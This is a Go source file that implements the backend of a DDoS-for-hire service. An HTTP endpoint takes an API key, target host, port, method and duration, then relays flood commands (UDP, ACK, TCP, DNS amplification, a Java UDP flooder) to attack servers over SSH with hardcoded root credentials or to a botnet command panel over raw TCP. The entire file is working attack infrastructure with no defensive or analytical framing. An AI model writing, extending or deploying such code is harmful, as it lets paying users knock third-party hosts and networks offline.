package main

import (
	"fmt"
	"net"
	"net/http"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

// Server struct now includes an SSH flag
type Server struct {
	IP       string
	Port     string
	Username string
	Password string
	UseSSH   bool // New field to determine if we use SSH
}

var attackMethods = []string{"UDPFLOOD", "!ss"}
var APIKeys = []string{"apikey123"}

var servers = []Server{
	{IP: "1.2.3.4", Port: "22", Username: "root", Password: "}9iM*A#Y4g_R,q9d", UseSSH: true}, // SSH server

}

func main() {
	http.HandleFunc("/", attackHandler)
	fmt.Println("Server started at :8080")
	http.ListenAndServe("0.0.0.0:8080", nil)
}

func attackHandler(w http.ResponseWriter, r *http.Request) {
	key := r.URL.Query().Get("key")
	host := r.URL.Query().Get("host")
	port := r.URL.Query().Get("port")
	method := r.URL.Query().Get("method")
	timeStr := r.URL.Query().Get("time")

	if key == "" || host == "" || port == "" || method == "" || timeStr == "" {
		http.Error(w, "You are missing a parameter", http.StatusBadRequest)
		return
	}

	portInt, err := strconv.Atoi(port)
	if err != nil || portInt < 1 || portInt > 65535 {
		http.Error(w, "Invalid port", http.StatusBadRequest)
		return
	}

	timeInt, err := strconv.Atoi(timeStr)
	if err != nil || timeInt <= 0 {
		http.Error(w, "Invalid time", http.StatusBadRequest)
		return
	}
	const maxTime = 100
	if timeInt > maxTime {
		http.Error(w, "u dont have that kinda time", http.StatusBadRequest)
		return
	}

	if !isValidHost(host) {
		http.Error(w, "Invalid host", http.StatusBadRequest)
		return
	}

	if !contains(APIKeys, key) {
		http.Error(w, "Invalid API key", http.StatusUnauthorized)
		return
	}

	if !contains(attackMethods, strings.ToUpper(method)) {
		http.Error(w, "Invalid attack method", http.StatusBadRequest)
		return
	}

	// WaitGroup to handle concurrency
	var wg sync.WaitGroup
	for _, server := range servers {
		wg.Add(1)
		go func(server Server) {
			defer wg.Done()
			if err := executeAttackOnServer(server, method, host, port, timeStr); err != nil {
				fmt.Fprintf(w, "Error executing attack on server %s: %v\n", server.IP, err)
			}
		}(server)
	}

	// Wait for all goroutines to complete
	wg.Wait()
	fmt.Fprintf(w, "Attack sent to %s:%s for %s seconds using method %s on all servers!\n", host, port, timeStr, method)
}

func isValidHost(host string) bool {
	if net.ParseIP(host) != nil {
		return true
	}
	matched, _ := regexp.MatchString(`^([a-zA-Z0-9-]{1,63}\.)+[a-zA-Z]{2,6}$`, host)
	return matched
}

func contains(slice []string, item string) bool {
	for _, v := range slice {
		if v == item {
			return true
		}
	}
	return false
}

func executeAttackOnServer(server Server, method, host, port, timeStr string) error {
	if server.UseSSH {
		return executeSSHCommand(server, method, host, port, timeStr)
	}
	return executeTCPCommand(server, method, host, port, timeStr)
}

func executeTCPCommand(server Server, method, host, port, timeStr string) error { // WE LOVE CHATGPT
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%s", server.IP, server.Port), 10*time.Second)
	if err != nil {
		return fmt.Errorf("Failed to connect to server %s", server.IP)
	}
	defer conn.Close()

	if err := sendCredentialsAndCommand(conn, server.Username, server.Password, method, host, port, timeStr); err != nil {
		return fmt.Errorf("Failed on server %s: %v", server.IP, err)
	}

	return nil
}

func executeSSHCommand(server Server, method, host, port, timeStr string) error {
	config := &ssh.ClientConfig{
		User: server.Username,
		Auth: []ssh.AuthMethod{
			ssh.Password(server.Password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         10 * time.Second,
	}

	client, err := ssh.Dial("tcp", fmt.Sprintf("%s:%s", server.IP, server.Port), config)
	if err != nil {
		return fmt.Errorf("Failed to connect to SSH server %s: %v", server.IP, err)
	}
	defer client.Close()

	// Commands per method
	commands := map[string][]string{
		"UDPFLOOD": {fmt.Sprintf("java udpflood.java %s %s %s", host, port, timeStr)}, // add more if u want more very simple stuff
	}

	if cmds, ok := commands[strings.ToUpper(method)]; ok {
		for _, cmd := range cmds {
			session, err := client.NewSession()
			if err != nil {
				return fmt.Errorf("Failed to create SSH session: %v", err)
			}

			// Execute the command
			if err := session.Run(cmd); err != nil {
				session.Close() // Close the session explicitly if there's an error
				return fmt.Errorf("Failed to run command on SSH server: %v", err)
			}

			// Close the session after command execution
			if err := session.Close(); err != nil {
				fmt.Printf("Error closing SSH session: %v\n", err)
			}

			// Sleep for 2 seconds before the next command
			time.Sleep(2 * time.Second)
		}
	} else {
		return fmt.Errorf("Invalid attack method: %s", method)
	}
	return nil
}

func sendCredentialsAndCommand(conn net.Conn, username, password, method, host, port, timeStr string) error {
	fmt.Println("Sending username...")
	if err := sendAndCheckResponse(conn, username, "password:", 2*time.Second); err != nil {
		return fmt.Errorf("Failed to send username: %s", err.Error())
	}

	fmt.Println("Sending password...")
	if err := sendAndCheckResponse(conn, password, "[contaigo]╼➤", 2*time.Second); err != nil {
		return fmt.Errorf("Failed to send password: %s", err.Error())
	}

	command := ""
	switch strings.ToUpper(method) {
	case "UDPAMP":
		command = fmt.Sprintf("dns %s %s %s", host, port, timeStr)
	case "TCPSTOMP":
		command = fmt.Sprintf("tcp %s %s %s", host, port, timeStr)
	case "ACK":
		command = fmt.Sprintf("ack %s %s %s", host, port, timeStr)
	case "UDP":
		command = fmt.Sprintf("udp %s %s %s", host, port, timeStr)
	default:
		return fmt.Errorf("Invalid attack method: %s", method)
	}

	fmt.Printf("Sending attack command: %s\n", command)
	if err := sendAndCheckResponse(conn, command, "Command sent", 2*time.Second); err != nil {
		return fmt.Errorf("Failed to send attack command: %s", err.Error())
	}
	return nil
}

func stripEscapeSequences(s string) string {
	re := regexp.MustCompile(`\x1B\[[0-9;]*[a-zA-Z]|\x1B\]0;[^\x07]*\x07`)
	return re.ReplaceAllString(s, "")
}

func sendAndCheckResponse(conn net.Conn, message, expectedResponse string, delay time.Duration) error { // if ur seeing this im in ur walls
	fmt.Fprintf(conn, "%s\n", message)
	time.Sleep(delay)
	response, err := readServerResponse(conn)
	if err != nil {
		return fmt.Errorf("failed to read server response: %v", err)
	}
	fmt.Printf("Server response after sending '%s': %q\n", message, response)
	if !strings.Contains(response, expectedResponse) {
		return fmt.Errorf("unexpected server response: %s", response)
	}
	return nil
}

func readServerResponse(conn net.Conn) (string, error) {
	responseBuffer := make([]byte, 4096)
	n, err := conn.Read(responseBuffer)
	if err != nil {
		return "", fmt.Errorf("Failed to read server response: %s", err.Error())
	}

	response := stripEscapeSequences(string(responseBuffer[:n]))
	return response, nil
}
